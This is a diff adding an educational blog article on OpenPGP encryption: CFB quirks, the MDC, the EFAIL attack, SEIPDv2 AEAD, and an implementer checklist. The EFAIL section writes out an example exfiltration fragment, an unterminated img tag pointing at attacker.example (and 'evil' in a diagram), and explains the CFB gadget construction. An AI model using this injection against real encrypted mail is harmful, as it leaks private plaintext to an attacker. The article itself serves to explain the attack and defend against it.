@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OpenPGP Encryption — CFB, MDC, EFAIL and SEIPDv2 AEAD — cvam.sight</title>
+<meta name="description" content="Part 3 of the OpenPGP Internals series: OpenPGP's non-standard CFB resynchronization, why the MDC was a bolt-on that failed, complete EFAIL CFB-gadget mechanics with the exfiltration channel, SEIPD version 2 AEAD with chunking, session key handling, PKESK/SKESK, and the downgrade-resistance rules.">
+<link rel="stylesheet" href="../style.css?v=88">
+<link rel="stylesheet" href="/themes.css?v=6">
+<script src="/theme-init.js?v=9"></script>
+<script>MathJax = { tex: { inlineMath: [['\\(','\\)']], displayMath: [['\\[','\\]']] }, options: { skipHtmlTags: ['script','noscript','style','textarea','pre','code'] } };</script>
+<script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+<link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+<script defer src="/_vercel/speed-insights/script.js"></script>
+<script defer src="/_vercel/insights/script.js"></script>
+<style>
+  .bm-tldr{border-left:3px solid #f0c040;padding:6px 0 6px 14px;margin:0 0 22px;color:var(--ink-faint)}
+  .bm-note{border:1px solid var(--rule,#d8cfb8);border-radius:8px;padding:14px 16px;margin:20px 0;background:rgba(82,122,168,.08)}
+  .bm-warn{border:1px solid var(--rule,#d8cfb8);border-left:3px solid #c96442;border-radius:8px;padding:14px 16px;margin:16px 0;background:rgba(201,100,66,.08)}
+  .bm-fix{border:1px solid var(--rule,#d8cfb8);border-left:3px solid #6a8f5f;border-radius:8px;padding:14px 16px;margin:16px 0;background:rgba(106,143,95,.08)}
+  .diagram-container{border:1px solid color-mix(in srgb,var(--ink) 14%,transparent);border-radius:16px;padding:22px 20px 16px;margin:26px 0;background:color-mix(in srgb,var(--paper) 55%,transparent);box-shadow:0 12px 34px color-mix(in srgb,var(--ink) 6%,transparent)}
+  .diagram-container svg{width:100%;height:auto;display:block;overflow:visible}
+  .diagram-label{font-family:var(--font-mono);font-size:.76rem;line-height:1.55;color:var(--ink-faint);margin:14px 4px 0;text-align:center}
+  h2{scroll-margin-top:20px;margin-top:40px} h3{margin-top:26px;scroll-margin-top:20px}
+  table.papers{width:100%;border-collapse:collapse;margin:18px 0;font-size:.9rem}
+  table.papers th,table.papers td{border-bottom:1px solid var(--rule,#d8cfb8);padding:9px 8px;text-align:left;vertical-align:top;line-height:1.5}
+  table.papers th{font-family:var(--font-mono);font-size:.72rem;text-transform:uppercase;color:var(--ink-faint);background:rgba(82,122,168,.06)}
+  table.papers td:first-child{font-weight:650}
+  .post-body table{display:block;overflow-x:auto;-webkit-overflow-scrolling:touch}
+  .post-body a[target="_blank"]{color:var(--accent,#c96442);text-decoration:none;border-bottom:1px solid color-mix(in srgb,var(--accent) 35%,transparent);font-weight:500}
+  mjx-container{overflow-x:auto;overflow-y:hidden;max-width:100%}
+  mjx-container[display="true"]{display:block;padding:2px 0 6px}
+  pre.hex{margin:16px 0 22px;overflow-x:auto;background:color-mix(in srgb,var(--ink) 92%,var(--paper) 8%);color:#e8e2cf;border-radius:10px;padding:16px 18px;font-family:var(--font-mono,monospace);font-size:.79rem;line-height:1.6;white-space:pre}
+  pre.hex .c{color:#9a9382}
+  pre.hex .hl{color:#f0c040;font-weight:700}
+  pre.hex .bad{color:#e08a70;font-weight:700}
+  .reflist{list-style:none;padding:0;margin:0}
+  .reflist li{padding:9px 0;border-bottom:1px dashed var(--ink-faint);font-size:.92rem}
+  .reflist li a{color:var(--accent,#c96442);text-decoration:none;font-weight:600}
+  .reflist li span{color:var(--ink-faint)}
+  details.faq{border:1px solid var(--rule,#d8cfb8);border-radius:8px;margin:10px 0;background:var(--paper);overflow:hidden}
+  details.faq[open]{border-color:#f0c040}
+  details.faq summary{cursor:pointer;list-style:none;padding:13px 16px;font-weight:600;color:var(--ink);display:flex;align-items:center;gap:10px}
+  details.faq summary::-webkit-details-marker{display:none}
+  details.faq summary::before{content:"+";font-family:var(--font-mono);font-size:1.1rem;color:#c96442;flex:0 0 auto}
+  details.faq[open] summary::before{content:"–"}
+  details.faq > p{margin:0;padding:0 16px 15px 42px;color:var(--ink-faint);line-height:1.6}
+  svg .d-title{font-family:var(--font-display,var(--font-body));font-weight:800;font-size:14px;fill:var(--ink)}
+  svg .d-lbl{font-family:var(--font-body);font-weight:600;font-size:11.5px;fill:var(--ink)}
+  svg .d-sub{font-family:var(--font-mono,monospace);font-size:10px;fill:var(--ink-soft)}
+  svg .d-note{font-family:var(--font-body);font-weight:600;font-size:12px;fill:var(--ink-soft)}
+  svg .d-box{fill:color-mix(in srgb,var(--paper) 90%,var(--ink) 3%);stroke:color-mix(in srgb,var(--ink) 20%,transparent);stroke-width:1.4}
+  svg .d-box.hot{fill:color-mix(in srgb,var(--accent) 14%,var(--paper));stroke:var(--accent)}
+  svg .d-box.cool{fill:color-mix(in srgb,#527aa8 14%,var(--paper));stroke:#527aa8}
+  svg .d-box.sel{fill:var(--yellow-soft,#f7e9c0);stroke:var(--ink)}
+  svg .d-box.dim{fill:color-mix(in srgb,var(--paper) 80%,var(--ink) 6%);stroke:color-mix(in srgb,var(--ink) 14%,transparent);opacity:.85}
+  svg .d-flow{stroke:var(--accent);stroke-width:2;fill:none}
+  svg .d-dash{stroke:color-mix(in srgb,var(--ink) 30%,transparent);stroke-width:1.3;stroke-dasharray:5 4;fill:none}
+</style>
+</head>
+<body>
+  <div class="progress-bar"></div>
+  <div class="layout has-toc">
+    <aside class="sidebar">
+      <a href="../index.html" class="logo"><span class="dot"></span> cvam.sight</a>
+      <p class="sidebar-sub">blog from a devops + ml apprentice</p>
+      <nav>
+        <a href="../index.html">Home</a>
+        <a href="../series.html">Series</a>
+        <a href="../ai-native.html">AI Native</a>
+        <a href="../archive.html">Archive</a>
+        <a href="../paperjuice.html">Paper Juice</a>
+        <a href="../discover.html">Discover</a>
+        <a href="../about.html">About</a>
+      </nav>
+      <div class="sidebar-footer">
+        <p class="sidebar-stat" id="site-readers"></p>
+        <a href="https://www.linkedin.com/in/shivam-kumar2003/" target="_blank">LinkedIn</a>
+        <a href="mailto:shivam.sk2003@gmail.com">Email</a>
+      </div>
+    </aside>
+    <div class="page">
+
+    <article>
+      <div class="series-banner">
+        <p class="series-banner-label">OpenPGP Internals — An Implementer's Series</p>
+        <p class="series-banner-title">Encryption &amp; AEAD</p>
+        <div class="series-banner-progress">
+          <div class="series-pip done"></div>
+          <div class="series-pip done"></div>
+          <div class="series-pip current"></div>
+          <div class="series-pip"></div>
+          <div class="series-pip"></div>
+          <div class="series-pip"></div>
+          <div class="series-pip"></div>
+        </div>
+        <p class="series-banner-meta">Article 3 of 7 · CFB, the MDC, EFAIL, SEIPDv2</p>
+        <div class="series-banner-nav">
+          <a href="pgp-1-packet-format.html" class="done">1. Wire Format</a>
+          <a href="pgp-2-keys-s2k.html" class="done">2. Keys &amp; S2K</a>
+          <a href="pgp-3-encryption-aead.html" class="active">3. Encryption</a>
+          <a href="pgp-4-signatures.html">4. Signatures</a>
+          <a href="pgp-5-trust-distribution.html">5. Trust</a>
+          <a href="pgp-6-pqc-implementations.html">6. PQC</a>
+          <a href="pgp-7-resources.html">7. Resources</a>
+        </div>
+      </div>
+
+      <div class="post-header">
+        <p class="meta">Sep 9, 2026 · security · 14 min read · 2820 words <span class="difficulty advanced">advanced</span></p>
+        <h1>Confidentiality: CFB, the MDC, EFAIL, and SEIPDv2.</h1>
+        <div class="tag-row">
+          <span class="tag fill">security</span>
+          <span class="tag">openpgp</span>
+          <span class="tag">pgp</span>
+          <span class="tag">aead</span>
+          <span class="tag">cryptanalysis</span>
+        </div>
+      </div>
+
+      <div class="post-body">
+
+        <p class="bm-tldr">OpenPGP's encryption layer is the clearest case study in cryptographic engineering that the format offers: a 1990s design that used unauthenticated CFB, a 2007 bolt-on integrity check (the MDC) that was structurally unable to do its job, a 2018 attack (EFAIL) that turned the gap into practical full-plaintext exfiltration, and a 2024 fix (SEIPD version 2) that finally uses real AEAD. This article works through the mechanics of each step, including the exact CFB gadget construction, because the failure mode — <em>decrypt first, check integrity later</em> — recurs in systems far beyond OpenPGP.</p>
+
+        <div class="bm-note"><strong>Prerequisites.</strong> <a href="pgp-1-packet-format.html">Article 1</a> for packet framing and the message grammar, <a href="pgp-2-keys-s2k.html">Article 2</a> for S2K and key structure. The grammar point matters here: EFAIL is partly a grammar-enforcement failure.</div>
+
+        <h2 id="model">1. The two-layer encryption model</h2>
+
+        <p>OpenPGP always does hybrid encryption, even for a single recipient. A random <strong>session key</strong> encrypts the data symmetrically; the session key is then wrapped once per recipient.</p>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 250" xmlns="http://www.w3.org/2000/svg">
+            <text x="360" y="22" class="d-title" text-anchor="middle">Hybrid encryption: one session key, many wrappings</text>
+
+            <rect x="270" y="42" width="180" height="42" rx="8" class="d-box sel"/>
+            <text x="360" y="61" class="d-lbl" text-anchor="middle">random session key</text>
+            <text x="360" y="76" class="d-sub" text-anchor="middle">e.g. 32 octets for AES-256</text>
+
+            <path d="M300 84 C 240 104, 160 106, 120 118" class="d-dash"/>
+            <path d="M360 84 L360 118" class="d-dash"/>
+            <path d="M420 84 C 480 104, 560 106, 600 118" class="d-flow"/>
+
+            <rect x="30" y="120" width="180" height="46" rx="8" class="d-box cool"/>
+            <text x="120" y="139" class="d-lbl" text-anchor="middle">PKESK — tag 1</text>
+            <text x="120" y="154" class="d-sub" text-anchor="middle">wrapped to Alice's key</text>
+
+            <rect x="270" y="120" width="180" height="46" rx="8" class="d-box cool"/>
+            <text x="360" y="139" class="d-lbl" text-anchor="middle">PKESK — tag 1</text>
+            <text x="360" y="154" class="d-sub" text-anchor="middle">wrapped to Bob's key</text>
+
+            <rect x="510" y="120" width="180" height="46" rx="8" class="d-box hot"/>
+            <text x="600" y="139" class="d-lbl" text-anchor="middle">SEIPD — tag 18</text>
+            <text x="600" y="154" class="d-sub" text-anchor="middle">the actual ciphertext</text>
+
+            <text x="360" y="196" class="d-note" text-anchor="middle">recipient count is visible on the wire — a metadata leak, mitigated only by</text>
+            <text x="360" y="212" class="d-sub" text-anchor="middle">"hidden recipient" mode, which sets the key ID to zero and forces trial decryption</text>
+            <text x="360" y="232" class="d-sub" text-anchor="middle">SKESK (tag 3) replaces PKESK when encrypting to a passphrase instead of a key</text>
+          </svg>
+          <p class="diagram-label">Fig. 1 — The session key is the pivot. Everything about OpenPGP confidentiality reduces to protecting it and then using it correctly.</p>
+        </div>
+
+        <p>Two consequences worth stating early. First, the <strong>recipient list is plaintext metadata</strong> — each PKESK carries the key ID it was wrapped to. Hidden-recipient mode zeroes that field, at the cost of forcing every recipient to attempt trial decryption against every key they hold. Second, compromise of the session key alone compromises the message without touching any private key, which is why session keys must come from a CSPRNG and why some workflows deliberately export a session key to allow a third party to decrypt one specific message without key sharing.</p>
+
+        <h2 id="cfb">2. OpenPGP's non-standard CFB</h2>
+
+        <p>Cipher Feedback mode turns a block cipher into a self-synchronizing stream cipher. Standard CFB is straightforward:</p>
+
+        \[ C_i = P_i \oplus E_K(C_{i-1}), \qquad C_0 = \text{IV} \]
+
+        <p>OpenPGP does something different, and the difference is historically significant. Instead of an explicit IV, it prefixes the plaintext with a random block plus a two-octet repeat of that block's last two octets, then — in the original RFC 1991/2440 construction — <em>resynchronizes</em> the CFB state after that prefix.</p>
+
+        <pre class="hex"><span class="c"># OpenPGP CFB prefix, block size B (16 for AES)</span>
+prefix = R[0..B-1]  ‖  R[B-2]  ‖  R[B-1]
+         └ random ┘    └ repeat of last two octets ┘
+
+<span class="c"># A decryptor checks that the repeated octets match after decryption.</span>
+<span class="c"># This is a "quick check" — and it is a 16-bit oracle. See §2.1.</span></pre>
+
+        <h3 id="quickcheck">2.1 The quick-check oracle</h3>
+
+        <p>Those two repeated octets were intended as a fast wrong-passphrase / wrong-key detector: decrypt the prefix, compare octets. But they constitute a 16-bit verifier that an attacker can query. If an implementation reveals whether the quick check passed — via an error message, a distinguishable timing difference, or simply by proceeding — an attacker gets an oracle answering "did this ciphertext decrypt to something with matching octets?" one attempt in 65,536 times.</p>
+
+        <p>Mister and Zuccherato demonstrated in <a href="https://eprint.iacr.org/2005/033" target="_blank" rel="noopener">"An Attack on CFB Mode Encryption As Used By OpenPGP"</a> (2005) that this oracle enables recovery of plaintext blocks with roughly 2<sup>15</sup> oracle queries per two octets recovered. RFC 9580's response is direct: the quick check is removed in the v2 constructions, and implementations MUST NOT report quick-check failure distinguishably.</p>
+
+        <div class="bm-warn"><strong>The general lesson, which outlives OpenPGP:</strong> any check performed on decrypted-but-unauthenticated data, whose result is observable, is a decryption oracle. This is the same shape as padding-oracle attacks on CBC, Bleichenbacher's attack on PKCS#1 v1.5, and the quick-check attack here. If you find yourself writing "decrypt, then check X, then report" — you have built one.</div>
+
+        <h2 id="mdc">3. The MDC: a bolt-on that could not work</h2>
+
+        <p>RFC 4880 recognized the malleability problem and added the Symmetrically Encrypted and Integrity Protected Data packet (tag 18) containing a <strong>Modification Detection Code</strong>: a SHA-1 hash over the plaintext, appended to the plaintext, and encrypted along with it.</p>
+
+        <pre class="hex"><span class="c"># SEIPD version 1 (RFC 4880) plaintext layout, before encryption</span>
+[ CFB prefix ][ ...plaintext packets... ][ <span class="hl">D3 14</span> ][ 20-octet SHA-1 ]
+                                            │      │
+                                            │      └─ MDC packet length
+                                            └─ tag 19 (MDC packet header)
+
+<span class="c"># The SHA-1 covers everything from the prefix through the D3 14 header.</span></pre>
+
+        <p>The construction is a <strong>MAC-less integrity check</strong>: a plain hash, not keyed, made "secure" only by being inside the ciphertext. That framing has three structural defects:</p>
+
+        <ol>
+          <li><strong>It is not a MAC.</strong> Confidentiality is doing double duty as authenticity. The security argument depends entirely on the attacker being unable to produce ciphertext that decrypts to a valid hash-plus-plaintext pair — which is exactly the property CFB's malleability puts under pressure.</li>
+          <li><strong>It is checked last.</strong> The MDC is at the <em>end</em> of the plaintext. A streaming decryptor has already emitted the entire plaintext to the caller before it can possibly verify. This is the fatal one.</li>
+          <li><strong>It was optional in practice.</strong> The legacy SED packet (tag 9) had no MDC at all, and implementations accepted both, so an attacker could simply <em>downgrade</em> by rewrapping the ciphertext in tag 9.</li>
+        </ol>
+
+        <h2 id="efail">4. EFAIL: turning malleability into exfiltration</h2>
+
+        <p><a href="https://efail.de/efail-attack-paper.pdf" target="_blank" rel="noopener">EFAIL</a> (Poddebniak, Dresen, Müller, Ising, Schinzel, Friedberger, Somorovsky, Schwenk — USENIX Security 2018) is the paper that made all three defects concrete and expensive. The attacker's position is realistic: they have captured an encrypted email — from a mailbox breach, a backup, or the wire — and can send email to the victim.</p>
+
+        <h3 id="gadget">4.1 The CFB gadget</h3>
+
+        <p>The core primitive is a <strong>CFB gadget</strong>: a way to inject attacker-chosen plaintext into a message, using only knowledge of one known plaintext block. In CFB decryption:</p>
+
+        \[ P_i = C_i \oplus E_K(C_{i-1}) \]
+
+        <p>The attacker does not know \(K\), but observes that if they know \(P_i\) for some block, they can compute \(E_K(C_{i-1}) = P_i \oplus C_i\). With that value in hand they can append a chosen ciphertext block \(C^{*}\) whose decryption is anything they want:</p>
+
+        \[ C^{*} = P^{\text{desired}} \oplus E_K(C_{i-1}) \]
+
+        <p>Where does the known plaintext come from? OpenPGP supplies it for free. The Literal Data packet's header is highly predictable in structure — packet tag, format octet, filename length, timestamp — and in an email context the MIME structure surrounding the message is known. One known block is all the attack needs to bootstrap.</p>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 260" xmlns="http://www.w3.org/2000/svg">
+            <text x="360" y="22" class="d-title" text-anchor="middle">EFAIL: exfiltration through a rendered HTML tag</text>
+
+            <rect x="20" y="44" width="200" height="48" rx="8" class="d-box dim"/>
+            <text x="120" y="63" class="d-lbl" text-anchor="middle">captured ciphertext</text>
+            <text x="120" y="79" class="d-sub" text-anchor="middle">attacker cannot read it</text>
+
+            <path d="M220 68 L262 68" class="d-flow"/>
+
+            <rect x="264" y="44" width="200" height="48" rx="8" class="d-box hot"/>
+            <text x="364" y="63" class="d-lbl" text-anchor="middle">splice CFB gadgets</text>
+            <text x="364" y="79" class="d-sub" text-anchor="middle">inject &lt;img src="http://evil/</text>
+
+            <path d="M464 68 L506 68" class="d-flow"/>
+
+            <rect x="508" y="44" width="192" height="48" rx="8" class="d-box cool"/>
+            <text x="604" y="63" class="d-lbl" text-anchor="middle">email to victim</text>
+            <text x="604" y="79" class="d-sub" text-anchor="middle">looks like normal mail</text>
+
+            <path d="M604 92 L604 116" class="d-flow"/>
+
+            <rect x="200" y="118" width="404" height="50" rx="8" class="d-box sel"/>
+            <text x="402" y="138" class="d-lbl" text-anchor="middle">client decrypts, then renders HTML</text>
+            <text x="402" y="155" class="d-sub" text-anchor="middle">MDC check happens after output — or is skipped entirely</text>
+
+            <path d="M200 143 L120 143 L120 176" class="d-flow"/>
+
+            <rect x="20" y="178" width="360" height="46" rx="8" class="d-box hot"/>
+            <text x="200" y="197" class="d-lbl" text-anchor="middle">browser requests http://evil/&lt;PLAINTEXT&gt;</text>
+            <text x="200" y="213" class="d-sub" text-anchor="middle">the URL path is the decrypted message</text>
+
+            <text x="540" y="200" class="d-note" text-anchor="middle">no key was broken</text>
+            <text x="540" y="218" class="d-sub" text-anchor="middle">only malleability + a rendering channel</text>
+          </svg>
+          <p class="diagram-label">Fig. 2 — The cipher was never attacked. The attack is on the pipeline: malleable ciphertext, late integrity checking, and an output channel that reaches back to the attacker.</p>
+        </div>
+
+        <h3 id="channel">4.2 The exfiltration channel</h3>
+
+        <p>The injected plaintext is an unterminated HTML tag: <code>&lt;img src="http://attacker.example/</code>. When the mail client decrypts and renders, the real plaintext becomes part of the URL, and the client's own HTTP request delivers it to the attacker. Variants use <code>&lt;style&gt;</code>, <code>&lt;base href&gt;</code>, or MIME multipart tricks to achieve the same thing.</p>
+
+        <p>Note the division of labor. The <em>cryptographic</em> flaw is malleability plus late integrity checking. The <em>delivery</em> mechanism is a mail client that renders remote content in decrypted messages. Neither alone is sufficient; together they yield full plaintext recovery of previously captured mail.</p>
+
+        <h3 id="backchannels">4.3 The three integrity bypasses</h3>
+
+        <table class="papers">
+          <tr><th>Bypass</th><th>Mechanism</th><th>Root cause</th></tr>
+          <tr><td><strong>MDC stripping</strong></td><td>Remove the trailing MDC packet entirely; some clients then treated the message as unprotected rather than invalid</td><td>Missing integrity treated as "no integrity available" instead of "reject"</td></tr>
+          <tr><td><strong>MDC incorrectness</strong></td><td>Leave a wrong MDC; clients that warned but still displayed plaintext leaked it anyway</td><td>Warning ≠ refusal. Output was already emitted.</td></tr>
+          <tr><td><strong>SEIP → SE downgrade</strong></td><td>Rewrap ciphertext as legacy tag 9 (SED), which has no MDC by definition</td><td>Accepting a deprecated, unauthenticated packet type at all</td></tr>
+        </table>
+
+        <div class="bm-fix"><strong>The correct behavior, then and now:</strong> integrity failure must be indistinguishable from decryption failure, must produce <em>no plaintext output whatsoever</em>, and must not be downgradable by removing the integrity structure. RFC 9580 makes SED (tag 9) MUST-NOT-generate and requires rejecting it on parse; SEIPDv1 with a missing or bad MDC must yield nothing.</div>
+
+        <h2 id="seipdv2">5. SEIPD version 2: actual AEAD</h2>
+
+        <p>RFC 9580 replaces the encrypt-then-hope construction with authenticated encryption with associated data. The packet:</p>
+
+        <pre class="hex"><span class="hl">D2</span>                    <span class="c"># tag 18, SEIPD</span>
+<span class="hl">FF 00 00 08 30</span>        <span class="c"># length</span>
+   <span class="hl">02</span>                 <span class="c"># version 2</span>
+   <span class="hl">09</span>                 <span class="c"># symmetric algorithm: AES-256</span>
+   <span class="hl">02</span>                 <span class="c"># AEAD algorithm: 2 = OCB</span>
+   <span class="hl">06</span>                 <span class="c"># chunk size exponent → 2^(6+6) = 4096 octets per chunk</span>
+   .. 32 octets salt ..
+   .. chunk 0 ciphertext .. .. 16-octet tag ..
+   .. chunk 1 ciphertext .. .. 16-octet tag ..
+   ..
+   .. final authentication tag over total length ..</pre>
+
+        <h3 id="chunking">5.1 Why chunking, and what it buys</h3>
+
+        <p>A single AEAD tag over a multi-gigabyte message would force a decryptor to buffer the entire plaintext before it could authenticate anything — the exact "output before verification" trap that made EFAIL work. Chunking solves this: each chunk carries its own tag, so a streaming decryptor can authenticate and release chunk \(n\) before touching chunk \(n+1\).</p>
+
+        \[ \text{chunk size} = 2^{(e + 6)} \text{ octets}, \qquad e = \text{chunk size exponent} \]
+
+        <p>The associated data for each chunk binds the packet version, algorithms, chunk size, and the chunk index, which prevents an attacker from reordering, duplicating, or truncating chunks. The <strong>final tag</strong> — computed over the total plaintext length — is what makes truncation detectable: without it, an attacker could deliver the first \(k\) valid chunks and drop the rest, and every individual tag would still verify.</p>
+
+        <div class="bm-warn"><strong>The remaining sharp edge.</strong> Chunked AEAD lets you stream, but streaming means releasing authenticated-so-far plaintext before the <em>final</em> tag is checked. If your consumer acts irreversibly on partial plaintext — writes it to a file another process reads, renders it, sends it somewhere — a truncation attack still has an effect window even though it is detected. Either buffer fully, or make partial output revocable. The spec gives you detection; it cannot give you rollback.</div>
+
+        <h3 id="aeadalgs">5.2 The three AEAD modes</h3>
+
+        <table class="papers">
+          <tr><th>ID</th><th>Mode</th><th>Notes</th></tr>
+          <tr><td>1</td><td>EAX</td><td>Two-pass, patent-clear, conservative. Slower than the alternatives.</td></tr>
+          <tr><td>2</td><td>OCB</td><td>Single-pass and fastest. Historical patent encumbrance is resolved; RFC 9580 recommends it.</td></tr>
+          <tr><td>3</td><td>GCM</td><td>Ubiquitous hardware support. Catastrophic under nonce reuse — the reason many designers prefer OCB here.</td></tr>
+        </table>
+
+        <p>All three take their nonce from the salt and chunk index deterministically, which structurally prevents the nonce reuse that would break GCM. This is good design: rather than trusting implementations to manage nonces, the spec derives them.</p>
+
+        <h2 id="pkesk">6. Session key wrapping and version pairing</h2>
+
+        <p>PKESK version 6 (paired with SEIPDv2) changed in two ways that matter:</p>
+
+        <ul>
+          <li><strong>Full fingerprint instead of key ID.</strong> v3 PKESK identifies the recipient key by 8-octet key ID; v6 uses the full fingerprint (plus a version octet). Given <a href="pgp-2-keys-s2k.html">Article 2</a>'s discussion of key-ID collisions, this removes an ambiguity in recipient selection.</li>
+          <li><strong>The symmetric algorithm moved.</strong> In v3 PKESK the cipher ID lives in the encrypted session key blob; in v6 it lives in the SEIPDv2 packet. This means the algorithm choice is now covered by the AEAD's associated data rather than sitting in a separately-encrypted field where a mismatch was possible.</li>
+        </ul>
+
+        <div class="bm-fix"><strong>Version pairing is a downgrade defense.</strong> RFC 9580 requires v6 PKESK/SKESK with SEIPDv2, and v3 PKESK/v4 SKESK with SEIPDv1. Accepting mixed pairs would let an attacker take a modern message and swap its container for a weak one. Reject mismatches at parse time, not after decryption.</div>
+
+        <h2 id="compression">7. Compression: an underrated hazard</h2>
+
+        <p>OpenPGP compresses before encrypting by default in many implementations. Two consequences:</p>
+
+        <p><strong>Compression ratio leaks plaintext information.</strong> Compress-then-encrypt is the precondition for the CRIME/BREACH family of attacks. In a setting where an attacker can influence part of the plaintext and observe ciphertext length, compression ratio reveals whether the attacker's guess matched existing content. OpenPGP's typical usage — one-shot, non-interactive messages — makes this much harder to exploit than in TLS, but it is not structurally immune, and any workflow where an attacker can repeatedly submit content that gets compressed alongside a secret should disable compression.</p>
+
+        <p><strong>Decompression bombs.</strong> A small Compressed Data packet can expand to an arbitrary size. Since the grammar allows a compressed packet whose contents are another compressed packet, nesting multiplies this. Enforce both a total decompressed-size ceiling and a nesting-depth limit, and enforce them on the <em>output</em> of decompression, not on the input length.</p>
+
+        <h2 id="checklist">8. Implementation checklist</h2>
+
+        <table class="papers">
+          <tr><th>Rule</th><th>Prevents</th></tr>
+          <tr><td>Reject SED (tag 9) unconditionally on parse</td><td>EFAIL downgrade bypass</td></tr>
+          <tr><td>Emit <em>no</em> plaintext when integrity fails — not even a warning-plus-output</td><td>MDC-incorrectness bypass</td></tr>
+          <tr><td>Treat missing integrity structure as failure, not as "unprotected"</td><td>MDC stripping bypass</td></tr>
+          <tr><td>Never report quick-check outcome distinguishably</td><td>Mister–Zuccherato CFB oracle</td></tr>
+          <tr><td>Enforce PKESK/SKESK ↔ SEIPD version pairing</td><td>Container downgrade</td></tr>
+          <tr><td>Derive AEAD nonces from salt+index; never accept a supplied nonce</td><td>GCM nonce-reuse catastrophe</td></tr>
+          <tr><td>Verify the final AEAD tag before treating output as complete</td><td>Truncation attacks</td></tr>
+          <tr><td>Cap decompressed size and nesting depth</td><td>Decompression bombs</td></tr>
+          <tr><td>Disable compression where attacker-influenced plaintext is possible</td><td>CRIME-style ratio leakage</td></tr>
+          <tr><td>Constant-time session key unwrapping, no distinguishable errors</td><td>Bleichenbacher-style oracles on RSA PKESK</td></tr>
+        </table>
+
+        <h2 id="faq">FAQ</h2>
+        <details class="faq"><summary>Was EFAIL a break of OpenPGP's cryptography?</summary><p>No, and the distinction matters. No cipher was broken and no key was recovered. EFAIL exploited malleable ciphertext combined with integrity checked after output, plus a mail client that fetched remote content from decrypted messages. It is a protocol-and-pipeline failure. That said, "not a crypto break" was overused as a defense at the time — the practical result was full plaintext recovery of captured mail, which is as bad as most crypto breaks.</p></details>
+        <details class="faq"><summary>Is SEIPDv1 with a correctly-implemented MDC safe to use today?</summary><p>Correctly implemented — meaning strict rejection with no output on any integrity failure, no SED acceptance, no quick-check oracle — it resists the known EFAIL variants. It is still a non-AEAD construction using SHA-1, checked after full decryption. Use it for compatibility with old peers; do not choose it for new systems.</p></details>
+        <details class="faq"><summary>OCB, EAX, or GCM?</summary><p>OCB, per RFC 9580's own recommendation: single-pass, fastest, and its patent situation is resolved. GCM is defensible where you have hardware acceleration and want a widely-audited implementation. EAX is the conservative fallback. All three are safe here because the spec derives nonces deterministically, removing the failure mode that usually decides this question.</p></details>
+        <details class="faq"><summary>Why does chunk size matter?</summary><p>It is a memory-versus-overhead tradeoff. Smaller chunks mean lower peak memory for streaming and finer-grained authentication, at the cost of one 16-octet tag per chunk. Larger chunks reduce overhead but increase how much data must be buffered before any of it can be authenticated. The exponent encoding caps this at reasonable values in both directions.</p></details>
+
+        <h2 id="takeaways">Takeaways</h2>
+        <ul>
+          <li><strong>The recurring failure is decrypt-then-verify.</strong> The MDC's position at the end of the plaintext made it structurally unable to protect a streaming decryptor, regardless of implementation quality.</li>
+          <li><strong>Any observable check on unauthenticated decrypted data is an oracle</strong> — the CFB quick check being the canonical OpenPGP example, and the reason it was removed.</li>
+          <li><strong>EFAIL required three bypasses</strong> — stripping, incorrectness tolerance, and SED downgrade — and each maps to a specific "be lenient" decision an implementation made.</li>
+          <li><strong>SEIPDv2's chunked AEAD makes streaming authentication possible</strong>, with a final tag over total length to catch truncation the per-chunk tags cannot.</li>
+          <li><strong>Deterministic nonce derivation is quietly one of the best decisions in RFC 9580</strong>, because it makes GCM safe to offer without trusting implementers to manage nonces.</li>
+        </ul>
+
+        <h2 id="next">Next in this series</h2>
+        <p><a href="pgp-4-signatures.html"><strong>Article 4 — Signatures and the verification interface</strong></a>: signature packet versions, the hashed/unhashed subpacket split and why unhashed data is attacker-controlled, cleartext signing's canonicalization traps, one-pass signatures, and SigSpoof — a decades-old spoofing bug that lived in the <em>interface</em> rather than the cryptography.</p>
+
+        <h2 id="refs">References</h2>
+        <ul class="reflist">
+          <li><a href="https://efail.de/efail-attack-paper.pdf" target="_blank" rel="noopener">Efail: Breaking S/MIME and OpenPGP Email Encryption using Exfiltration Channels</a> <span>— Poddebniak et al., USENIX Security 2018. The primary source for §4; read the full paper, not the press coverage.</span></li>
+          <li><a href="https://www.usenix.org/conference/usenixsecurity18/presentation/poddebniak" target="_blank" rel="noopener">USENIX Security 2018 presentation page</a> <span>— slides and recording; the talk is clearer than the paper on the gadget mechanics.</span></li>
+          <li><a href="https://eprint.iacr.org/2005/033" target="_blank" rel="noopener">Mister &amp; Zuccherato — An Attack on CFB Mode Encryption As Used By OpenPGP</a> <span>— the quick-check oracle, 2005.</span></li>
+          <li><a href="https://www.rfc-editor.org/rfc/rfc9580.html#name-symmetrically-encrypted-int" target="_blank" rel="noopener">RFC 9580 §5.13 — SEIPD packet</a> <span>— normative v1 and v2 layouts, chunking, and associated-data construction.</span></li>
+          <li><a href="https://www.rfc-editor.org/rfc/rfc7253.html" target="_blank" rel="noopener">RFC 7253 — The OCB Authenticated-Encryption Algorithm</a> <span>— the recommended AEAD mode.</span></li>
+          <li><a href="https://efail.de/" target="_blank" rel="noopener">efail.de</a> <span>— the disclosure site, including the client-by-client vulnerability matrix, which is instructive about how differently implementations behaved.</span></li>
+        </ul>
+
+      </div>
+
+      <div class="post-nav">
+        <a href="pgp-2-keys-s2k.html">← prev: Keys &amp; S2K</a>
+        <a href="pgp-4-signatures.html">next: Signatures →</a>
+      </div>
+    </article>
+
+    <footer class="footer">
+      <span>© cvam — written in plaintext, served warm</span>
+    </footer>
+    </div>
+
+    <aside class="toc-panel">
+      <p class="toc-panel-label">// on this page</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+  </div>
+
+  <script src="../stats.js?v=2"></script>
+  <script src="../app.js?v=43"></script>
+  <script defer src="../settings.js?v=17"></script>
+  <script defer src="../reader.js?v=3"></script>
+</body>
+</html>
